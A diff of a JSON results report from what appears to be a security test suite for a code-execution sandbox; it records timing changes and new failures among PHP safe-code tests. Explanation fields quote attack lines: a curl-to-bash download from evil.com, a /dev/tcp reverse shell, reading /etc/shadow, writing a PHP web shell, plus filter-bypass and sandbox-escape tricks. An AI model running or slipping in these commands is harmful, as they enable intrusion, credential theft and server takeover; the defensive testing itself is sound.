@@ -1,11 +1,11 @@
 {
-  "timestamp": "2026-01-06T20:30:33.635Z",
+  "timestamp": "2026-01-06T22:47:31.191Z",
   "summary": {
     "total": 258,
-    "passed": 253,
-    "failed": 5,
-    "passRate": "98.1%",
-    "duration": "7.53s"
+    "passed": 248,
+    "failed": 10,
+    "passRate": "96.1%",
+    "duration": "5.88s"
   },
   "statistics": {
     "byLanguage": {
@@ -26,8 +26,8 @@
       },
       "php": {
         "total": 70,
-        "passed": 70,
-        "failed": 0
+        "passed": 65,
+        "failed": 5
       },
       "java": {
         "total": 46,
@@ -103,8 +103,8 @@
       },
       "safe_code": {
         "total": 24,
-        "passed": 19,
-        "failed": 5
+        "passed": 14,
+        "failed": 10
       },
       "type_abuse": {
         "total": 4,
@@ -192,7 +192,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 29,
+      "duration": 139,
       "explanation": "\n      🎯 ATTACK: Shell Command Execution via child_process\n      \n      How hackers use this:\n      Attackers import Node.js's child_process module to execute arbitrary shell commands\n      on the server. This is the most direct way to achieve Remote Code Execution (RCE).\n      \n      Real-world impact:\n      - Execute 'rm -rf /' to delete all server files\n      - Run 'cat /etc/passwd' to steal user credentials\n      - Install backdoors, cryptocurrency miners, or ransomware\n      - Pivot to attack other systems on the network\n      \n      Example attack chain:\n      1. exec('curl http://evil.com/backdoor.sh | bash')\n      2. Server downloads and executes attacker's script\n      3. Attacker gains persistent access to the server\n    "
     },
     {
@@ -203,7 +203,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: ES Module Import of child_process\n      \n      How hackers use this:\n      Same as require(), but using modern ES module syntax. Attackers try both\n      CommonJS (require) and ESM (import) to bypass filters that only check one style.\n      \n      Real-world impact:\n      - List all files to find sensitive configuration\n      - Map the server's directory structure for further attacks\n      - Identify installed software and versions for targeted exploits\n    "
     },
     {
@@ -214,7 +214,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Process Spawning with Arguments\n      \n      How hackers use this:\n      spawn() allows passing command arguments as an array, which can bypass\n      filters looking for command strings. It's also better for long-running processes.\n      \n      Real-world impact:\n      - Spawn reverse shells: spawn('bash', ['-c', 'bash -i >& /dev/tcp/evil.com/4444 0>&1'])\n      - Run background processes that persist after the main script ends\n      - Execute binaries with complex argument combinations\n    "
     },
     {
@@ -225,7 +225,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Synchronous Command Execution\n      \n      How hackers use this:\n      execSync() blocks until the command completes and returns the output directly.\n      This makes it easy to extract data in a single expression.\n      \n      Real-world impact:\n      - Exfiltrate data: execSync('cat /etc/shadow').toString()\n      - Check user privileges: execSync('id') shows if running as root\n      - More reliable than async when attacker needs immediate results\n    "
     },
     {
@@ -236,7 +236,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 14,
       "explanation": "\n      🎯 ATTACK: Direct Binary Execution\n      \n      How hackers use this:\n      execFile() runs a specific binary without going through a shell.\n      This can bypass shell-based security measures and is harder to detect.\n      \n      Real-world impact:\n      - Execute compiled malware directly\n      - Run system utilities without shell logging\n      - Avoid shell escaping issues for reliable exploitation\n    "
     },
     {
@@ -247,7 +247,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Forking Node.js Processes\n      \n      How hackers use this:\n      fork() creates a new Node.js process that can communicate with the parent.\n      Attackers use this to run persistent background malware.\n      \n      Real-world impact:\n      - Run cryptocurrency miners in forked processes\n      - Create process networks for distributed attacks\n      - Maintain persistence even if main process is killed\n    "
     },
     {
@@ -258,7 +258,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: String Concatenation Filter Bypass\n      \n      How hackers use this:\n      By splitting dangerous module names into pieces, attackers try to evade\n      pattern-based security filters that look for exact strings.\n      \n      Real-world impact:\n      - Bypass simple regex filters: 'child' + '_process' !== 'child_process' to naive filters\n      - This is why we block ALL dynamic requires, not just specific module names\n      - Forces security to think about semantic analysis, not just string matching\n    "
     },
     {
@@ -269,7 +269,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Array Join Filter Bypass\n      \n      How hackers use this:\n      Using array operations to construct module names at runtime,\n      making static analysis nearly impossible.\n      \n      Real-world impact:\n      - More sophisticated than simple concatenation\n      - Can be combined with encoding to further obfuscate\n      - Demonstrates why allowlisting is better than blocklisting\n    "
     },
     {
@@ -280,7 +280,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 12,
       "explanation": "\n      🎯 ATTACK: File System Access via fs Module\n      \n      How hackers use this:\n      The fs module provides complete filesystem access. Attackers use it to\n      read sensitive files, write malware, or modify configurations.\n      \n      Real-world impact:\n      - Read /etc/passwd, /etc/shadow for credential theft\n      - Read .env files containing API keys and database passwords\n      - Modify application code to inject backdoors\n      - Read private SSH keys for lateral movement\n    "
     },
     {
@@ -291,7 +291,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 16,
       "explanation": "\n      🎯 ATTACK: Promise-based File Access\n      \n      How hackers use this:\n      fs/promises is the modern async API for file operations. Attackers use it\n      when await/async is available, which is common in modern Node.js.\n      \n      Real-world impact:\n      - Same as fs, but with cleaner async code\n      - Often overlooked by filters that only check 'fs'\n      - Part of comprehensive fs blocking strategy\n    "
     },
     {
@@ -302,7 +302,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 10,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Writing Malicious Files\n      \n      How hackers use this:\n      Writing files allows persistent attacks - malware that survives restarts,\n      web shells for continued access, or configuration changes.\n      \n      Real-world impact:\n      - Write web shells: writeFileSync('/var/www/shell.php', '<?php system($_GET[\"cmd\"]); ?>')\n      - Modify cron jobs for persistence\n      - Overwrite legitimate code with trojaned versions\n      - Create SSH authorized_keys for backdoor access\n    "
     },
     {
@@ -313,7 +313,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 9,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Directory Enumeration\n      \n      How hackers use this:\n      Listing directories helps attackers understand the system structure,\n      find sensitive files, and plan further attacks.\n      \n      Real-world impact:\n      - Map application structure to find config files\n      - Discover backup files with credentials\n      - Find log files with sensitive information\n      - Locate other users' home directories\n    "
     },
     {
@@ -324,7 +324,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Node.js Protocol Import Bypass\n      \n      How hackers use this:\n      The 'node:' prefix is an alternative way to import built-in modules.\n      Attackers try this when regular imports are blocked.\n      \n      Real-world impact:\n      - Steal SSH private keys for server access\n      - Same capabilities as regular fs, different import path\n      - Tests thoroughness of import blocking\n    "
     },
     {
@@ -335,7 +335,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Data Exfiltration via HTTP\n      \n      How hackers use this:\n      Network access allows attackers to send stolen data to external servers\n      or download additional malware payloads.\n      \n      Real-world impact:\n      - Exfiltrate stolen credentials, tokens, or sensitive data\n      - Download second-stage malware\n      - Connect to Command & Control (C2) servers\n      - Launch attacks against other systems\n    "
     },
     {
@@ -346,7 +346,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Encrypted Data Exfiltration\n      \n      How hackers use this:\n      HTTPS makes exfiltration harder to detect because the traffic is encrypted.\n      Security tools can't inspect the content without SSL interception.\n      \n      Real-world impact:\n      - Evade network-level security monitoring\n      - Appear as legitimate HTTPS traffic\n      - Harder to distinguish from normal API calls\n    "
     },
     {
@@ -357,7 +357,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Raw TCP Connection (Reverse Shell)\n      \n      How hackers use this:\n      The net module provides raw socket access, commonly used to create\n      reverse shells that connect back to attacker-controlled servers.\n      \n      Real-world impact:\n      - Establish reverse shells for interactive access\n      - Bypass firewalls that only filter inbound connections\n      - Create covert channels for data exfiltration\n      - Port scanning and network reconnaissance\n    "
     },
     {
@@ -368,7 +368,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: UDP-based Communication\n      \n      How hackers use this:\n      UDP can bypass some firewalls and monitoring that focus on TCP.\n      It's used for DNS exfiltration and covert channels.\n      \n      Real-world impact:\n      - DNS tunneling to exfiltrate data\n      - Participate in DDoS amplification attacks\n      - Covert communication that evades TCP monitoring\n    "
     },
     {
@@ -379,7 +379,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: Modern HTTP Data Exfiltration\n      \n      How hackers use this:\n      fetch() is the modern way to make HTTP requests. Attackers use it to\n      send stolen data to external servers with minimal code.\n      \n      Real-world impact:\n      - Send JSON payloads of stolen data\n      - Make API calls to attacker infrastructure\n      - Cleaner syntax than http module, often overlooked\n    "
     },
     {
@@ -390,7 +390,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Persistent WebSocket Connection\n      \n      How hackers use this:\n      WebSockets provide bidirectional, persistent connections - perfect for\n      interactive remote shells and real-time data streaming.\n      \n      Real-world impact:\n      - Interactive reverse shells with low latency\n      - Real-time exfiltration of keystrokes/data\n      - Persistent connection that survives page reloads\n      - Harder to detect than repeated HTTP requests\n    "
     },
     {
@@ -401,7 +401,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Environment Variable Theft\n      \n      How hackers use this:\n      Environment variables often contain sensitive configuration like\n      API keys, database passwords, and secret tokens.\n      \n      Real-world impact:\n      - Steal AWS_SECRET_ACCESS_KEY for cloud account takeover\n      - Get DATABASE_URL with credentials\n      - Find JWT_SECRET to forge authentication tokens\n      - Access STRIPE_SECRET_KEY for financial fraud\n    "
     },
     {
@@ -412,7 +412,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Denial of Service (DoS)\n      \n      How hackers use this:\n      Terminating the process causes service disruption. In a shared\n      environment, this affects all users.\n      \n      Real-world impact:\n      - Crash the server, causing downtime\n      - Disrupt service for legitimate users\n      - Part of extortion/ransom attacks\n      - Cover tracks by crashing before logging\n    "
     },
     {
@@ -423,7 +423,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Process Termination\n      \n      How hackers use this:\n      Sending signals to processes can terminate them or alter their behavior.\n      SIGKILL cannot be caught or ignored.\n      \n      Real-world impact:\n      - Kill the application process\n      - Kill other processes on the system (if permissions allow)\n      - Disrupt related services\n    "
     },
     {
@@ -434,7 +434,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Path Disclosure\n      \n      How hackers use this:\n      Knowing the current working directory helps attackers understand\n      the application structure and plan path traversal attacks.\n      \n      Real-world impact:\n      - Reveals server file structure\n      - Helps construct path traversal attacks\n      - Information gathering for targeted exploits\n    "
     },
     {
@@ -445,7 +445,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 12,
       "explanation": "\n      🎯 ATTACK: System Information Gathering\n      \n      How hackers use this:\n      The os module reveals system details useful for fingerprinting\n      and planning targeted attacks.\n      \n      Real-world impact:\n      - Get hostname for network mapping\n      - Find username running the process\n      - Detect OS version for targeted exploits\n      - Measure available memory for resource attacks\n    "
     },
     {
@@ -456,7 +456,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 15,
       "explanation": "\n      🎯 ATTACK: Process Multiplication (Fork Bomb)\n      \n      How hackers use this:\n      The cluster module can spawn multiple processes, potentially\n      creating a fork bomb that exhausts system resources.\n      \n      Real-world impact:\n      - Denial of Service through resource exhaustion\n      - Crash the entire server\n      - Affect other applications on shared hosting\n    "
     },
     {
@@ -467,7 +467,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Background Thread Execution\n      \n      How hackers use this:\n      Worker threads run in parallel and can execute malicious code\n      independently of the main thread.\n      \n      Real-world impact:\n      - Run CPU-intensive attacks (cryptomining)\n      - Execute code that survives main thread termination\n      - Parallel processing for faster data theft\n    "
     },
     {
@@ -478,7 +478,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: VM Sandbox Escape\n      \n      How hackers use this:\n      The vm module creates \"sandboxed\" contexts, but they're not secure.\n      Attackers can escape to access the main context.\n      \n      Real-world impact:\n      - Bypass intended sandboxing\n      - Access global objects from \"isolated\" context\n      - Execute arbitrary code with full privileges\n    "
     },
     {
@@ -489,7 +489,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Dynamic Code Execution via eval()\n      \n      How hackers use this:\n      eval() executes arbitrary JavaScript strings. Attackers use it to\n      construct and run malicious code dynamically.\n      \n      Real-world impact:\n      - Execute obfuscated malicious code\n      - Bypass static code analysis\n      - Combine with encoding to evade detection\n      - The classic \"eval is evil\" security issue\n    "
     },
     {
@@ -500,7 +500,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Code Generation via Function Constructor\n      \n      How hackers use this:\n      The Function constructor is eval() in disguise. It creates new functions\n      from strings, allowing dynamic code execution.\n      \n      Real-world impact:\n      - Often missed by filters that only block eval()\n      - Can construct and execute any JavaScript\n      - Bypass CSP that blocks eval but not Function\n    "
     },
     {
@@ -511,7 +511,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: Runtime Module Loading\n      \n      How hackers use this:\n      Dynamic import() allows loading modules at runtime with computed names,\n      bypassing static analysis and import restrictions.\n      \n      Real-world impact:\n      - Load dangerous modules with obfuscated names\n      - Conditional loading to evade detection\n      - Import from external URLs (in some environments)\n    "
     },
     {
@@ -522,7 +522,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Memory Information Disclosure\n      \n      How hackers use this:\n      Buffer.allocUnsafe() doesn't initialize memory, potentially exposing\n      data from previous allocations (passwords, keys, etc.).\n      \n      Real-world impact:\n      - Read sensitive data from uninitialized memory\n      - Heartbleed-style information disclosure\n      - Extract cryptographic keys or passwords\n      - Memory forensics without direct access\n    "
     },
     {
@@ -533,7 +533,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 22,
       "explanation": "\n      🎯 ATTACK: Character Code Obfuscation\n      \n      How hackers use this:\n      Converting strings to/from character codes hides malicious module names\n      from pattern-based filters.\n      \n      Real-world impact:\n      - 'child_process' as char codes: 99,104,105,108,100,95...\n      - Bypasses simple string matching\n      - Common in malware and exploit kits\n      - Why we block the encoding functions themselves\n    "
     },
     {
@@ -544,7 +544,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Base64 Encoded Payload\n      \n      How hackers use this:\n      Base64 encoding is widely used to hide malicious strings.\n      'Y2hpbGRfcHJvY2Vzcw==' decodes to 'child_process'.\n      \n      Real-world impact:\n      - Hide malicious code in seemingly random strings\n      - Bypass WAFs and pattern filters\n      - Standard technique in web exploitation\n      - Often combined with other encoding layers\n    "
     },
     {
@@ -555,7 +555,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Hex Encoded Module Name\n      \n      How hackers use this:\n      Hex encoding converts strings to hexadecimal, evading string-based filters.\n      '6368696c645f70726f63657373' = 'child_process' in hex.\n      \n      Real-world impact:\n      - Alternative to base64 for obfuscation\n      - Can bypass filters that block base64 but not hex\n      - Common in exploit development\n    "
     },
     {
@@ -566,7 +566,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 15,
       "explanation": "\n      🎯 ATTACK: Unicode Escape Sequence\n      \n      How hackers use this:\n      JavaScript supports unicode escapes in strings. '\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073'\n      is 'process' - used to access global.process.env.\n      \n      Real-world impact:\n      - Bypass keyword filters\n      - Access blocked properties via bracket notation\n      - Valid JavaScript that looks like garbage\n    "
     },
     {
@@ -577,7 +577,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Hex Character Escapes\n      \n      How hackers use this:\n      Similar to unicode escapes, hex escapes hide string content.\n      '\\x70\\x72\\x6f\\x63\\x65\\x73\\x73' = 'process'.\n      \n      Real-world impact:\n      - Shorter than unicode escapes\n      - Equally effective at bypassing filters\n      - Common in JavaScript obfuscators\n    "
     },
     {
@@ -588,7 +588,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Prototype Pollution via __proto__\n      \n      How hackers use this:\n      Modifying Object.prototype affects ALL objects in the application.\n      This can lead to privilege escalation, RCE, or DoS.\n      \n      Real-world impact:\n      - Add malicious properties to all objects\n      - Bypass security checks: if(obj.isAdmin) becomes true for all\n      - Can lead to RCE in certain frameworks\n      - CVE-2019-11358 (jQuery), CVE-2020-8203 (Lodash)\n    "
     },
     {
@@ -599,7 +599,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Prototype Manipulation via setPrototypeOf\n      \n      How hackers use this:\n      setPrototypeOf can change an object's prototype chain, injecting\n      malicious methods that appear to be inherited.\n      \n      Real-world impact:\n      - Inject malicious methods into objects\n      - Modify behavior of built-in types\n      - Bypass instanceof checks\n    "
     },
     {
@@ -610,7 +610,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: Prototype Pollution via constructor\n      \n      How hackers use this:\n      Accessing prototype through constructor is another pollution vector\n      that may bypass filters checking only for __proto__.\n      \n      Real-world impact:\n      - Alternative path to prototype pollution\n      - Affects all objects sharing that prototype\n      - Can corrupt application state globally\n    "
     },
     {
@@ -621,7 +621,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 19,
       "explanation": "\n      🎯 ATTACK: globalThis Environment Access\n      \n      How hackers use this:\n      globalThis is the standard way to access the global object in any\n      JavaScript environment. It provides access to process in Node.js.\n      \n      Real-world impact:\n      - Access process.env for credential theft\n      - Reach any global object or function\n      - Works in both browser and Node.js\n    "
     },
     {
@@ -632,7 +632,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Node.js Global Object Chain\n      \n      How hackers use this:\n      The global object chain (global.process.mainModule.require) can be\n      used to access require() even when it's not directly available.\n      \n      Real-world impact:\n      - Bypass sandboxes that hide require()\n      - Access dangerous modules through the prototype chain\n      - Classic VM escape technique\n    "
     },
     {
@@ -643,7 +643,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Constructor Chain Sandbox Escape\n      \n      How hackers use this:\n      this.constructor.constructor is the Function constructor. It can\n      create functions that return global objects, escaping sandboxes.\n      \n      Real-world impact:\n      - Escape vm2, safeeval, and similar sandboxes\n      - Access process even in \"restricted\" contexts\n      - Well-known technique in CTF competitions\n    "
     },
     {
@@ -654,7 +654,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Reflection-based Property Access\n      \n      How hackers use this:\n      Reflect API provides an alternative way to access object properties\n      that may bypass property access hooks.\n      \n      Real-world impact:\n      - Bypass proxy-based sandboxes\n      - Access properties through reflection\n      - Alternative to direct property access\n    "
     },
     {
@@ -665,7 +665,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Proxy Trap for Code Execution\n      \n      How hackers use this:\n      Proxies can intercept property access and execute arbitrary code.\n      The handler functions can contain malicious payloads.\n      \n      Real-world impact:\n      - Execute code when properties are accessed\n      - Hide malicious behavior in proxy handlers\n      - Create objects with dangerous side effects\n    "
     },
     {
@@ -676,7 +676,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Delayed Code Execution via setTimeout\n      \n      How hackers use this:\n      setTimeout with a string argument acts like eval(), executing\n      the string as code after a delay.\n      \n      Real-world impact:\n      - Delayed execution to evade real-time monitoring\n      - Execute code after security checks complete\n      - Legacy eval equivalent that's often overlooked\n    "
     },
     {
@@ -687,7 +687,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Interval-based Denial of Service\n      \n      How hackers use this:\n      Rapid setInterval calls can exhaust resources or cause continuous\n      errors that disrupt normal operation.\n      \n      Real-world impact:\n      - Resource exhaustion through rapid callbacks\n      - Continuous error generation\n      - Event loop saturation\n    "
     },
     {
@@ -698,7 +698,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Immediate Callback Execution\n      \n      How hackers use this:\n      setImmediate schedules callbacks to run as soon as possible,\n      potentially executing malicious code before cleanup.\n      \n      Real-world impact:\n      - Execute before synchronous code completes\n      - Race condition exploitation\n      - Queue flooding for DoS\n    "
     },
     {
@@ -709,7 +709,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 12,
       "explanation": "\n      🎯 ATTACK: Promise-based Deferred Execution\n      \n      How hackers use this:\n      Promises allow deferred execution that may bypass synchronous\n      security checks or auditing.\n      \n      Real-world impact:\n      - Execute after current call stack completes\n      - Evade synchronous monitoring\n      - Chain multiple malicious operations\n    "
     },
     {
@@ -720,7 +720,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 20,
       "explanation": "\n      🎯 ATTACK: Microtask Queue Injection\n      \n      How hackers use this:\n      queueMicrotask schedules code before other async callbacks,\n      potentially executing before cleanup or security checks.\n      \n      Real-world impact:\n      - Higher priority than setTimeout callbacks\n      - Execute before promise handlers in queue\n      - Subtle timing-based attacks\n    "
     },
     {
@@ -731,7 +731,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Cryptographic Operations\n      \n      How hackers use this:\n      While crypto itself isn't directly dangerous, it can be used to\n      generate keys for malware, encrypt stolen data, or for crypto mining.\n      \n      Real-world impact:\n      - Generate encryption keys for ransomware\n      - Create secure channels for data exfiltration\n      - Cryptocurrency mining operations\n    "
     },
     {
@@ -742,7 +742,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Stream-based Data Processing\n      \n      How hackers use this:\n      Streams can be used to process large amounts of data efficiently,\n      useful for exfiltration or processing malicious payloads.\n      \n      Real-world impact:\n      - Stream large files for exfiltration\n      - Process binary payloads\n      - Create pipes between processes\n    "
     },
     {
@@ -764,7 +764,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 83,
+      "duration": 358,
       "explanation": "\n      ✅ SAFE: Basic Console Output\n      \n      This is legitimate code that should execute:\n      Simple console output is the foundation of learning to code\n      and debugging. No security risk.\n    ",
       "stdout": "Hello, World!",
       "stderr": "(node:31) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)",
@@ -778,7 +778,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 59,
+      "duration": 232,
       "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic operations are fundamental to programming\n      and pose no security risk.\n    ",
       "stdout": "4",
       "stderr": "(node:37) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)",
@@ -792,7 +792,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 83,
+      "duration": 138,
       "explanation": "\n      ✅ SAFE: Array Methods\n      \n      This is legitimate code that should execute:\n      Array manipulation methods like map, filter, and join are\n      essential for data processing.\n    ",
       "stdout": "2,4,6",
       "stderr": "(node:43) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)",
@@ -806,7 +806,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 72,
+      "duration": 515,
       "explanation": "\n      ✅ SAFE: Async/Await Patterns\n      \n      This is legitimate code that should execute:\n      Promise-based async code with short delays is common and safe.\n      Teaching async patterns is important.\n    ",
       "stdout": "done",
       "stderr": "(node:49) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)",
@@ -820,7 +820,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 26,
       "explanation": "\n      🎯 ATTACK: TypeScript Typed Imports of Dangerous Modules\n      \n      How hackers use this:\n      TypeScript's type annotations don't change runtime behavior.\n      Adding types to dangerous imports doesn't make them safe.\n      \n      Real-world impact:\n      - Same as JavaScript child_process attacks\n      - Type safety doesn't provide security\n      - Compiled JS will execute just like untyped code\n      \n      Key insight:\n      TypeScript is a SUPERSET of JavaScript - if it's dangerous in JS,\n      it's equally dangerous in TS. Types are stripped at compile time.\n    "
     },
     {
@@ -831,7 +831,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: Generic Wrapper Around Dangerous Functions\n      \n      How hackers use this:\n      Wrapping dangerous functions in TypeScript generics and promises\n      obfuscates the malicious intent while preserving functionality.\n      \n      Real-world impact:\n      - Type-safe interface to command execution\n      - Makes malicious code look like legitimate utilities\n      - Generic typing can confuse code reviewers\n    "
     },
     {
@@ -842,7 +842,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 16,
       "explanation": "\n      🎯 ATTACK: Type-Safe File Operations\n      \n      How hackers use this:\n      TypeScript's PathLike type makes file access look legitimate,\n      but the underlying operation is still dangerous.\n      \n      Real-world impact:\n      - Read sensitive system files with proper typing\n      - Code appears more \"professional\" and reviewable\n      - Same security implications as raw fs access\n    "
     },
     {
@@ -853,7 +853,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 15,
       "explanation": "\n      🎯 ATTACK: Structured File Content Extraction\n      \n      How hackers use this:\n      Wrapping stolen file content in typed interfaces makes the code\n      look like legitimate data processing.\n      \n      Real-world impact:\n      - /etc/shadow contains password hashes\n      - Structured exfiltration payload\n      - Types don't validate or sanitize content\n    "
     },
     {
@@ -864,7 +864,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 130,
       "explanation": "\n      🎯 ATTACK: Type-Annotated Network Requests\n      \n      How hackers use this:\n      Adding TypeScript interfaces to network requests doesn't change\n      their ability to exfiltrate data or beacon to C2 servers.\n      \n      Real-world impact:\n      - Phone home to attacker infrastructure\n      - Exfiltrate data with typed payloads\n      - Proper typing makes malware more maintainable\n    "
     },
     {
@@ -875,7 +875,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 33,
       "explanation": "\n      🎯 ATTACK: Modern Async Network Communication\n      \n      How hackers use this:\n      async/await with typed responses makes malicious network code\n      look like legitimate API integration.\n      \n      Real-world impact:\n      - Clean async exfiltration code\n      - Type-safe C2 communication\n      - Easier to maintain attack infrastructure\n    "
     },
     {
@@ -886,7 +886,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 24,
